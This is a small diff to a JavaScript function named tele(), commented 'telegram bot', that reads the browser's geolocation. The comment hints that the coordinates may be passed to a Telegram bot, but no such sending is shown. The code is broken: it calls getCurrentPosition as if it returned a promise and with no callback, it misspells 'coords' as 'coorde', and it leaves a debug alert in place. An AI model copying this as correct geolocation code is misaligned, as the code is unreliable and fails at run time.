@@ -52,9 +52,9 @@
 function tele(){
       ////  telegram bot  ////
         
-      if('Geolocation' in navigator){ 
+      if(navigator.geolocation){ 
         alert(1)
-        navigator.geolocation.getCurrentPosition(success).then(x=>{
+        navigator.geolocation.getCurrentPosition().then(x=>{
           const latitude  = x.coords.latitude;
           const longitude = x.coorde.longitude;
 
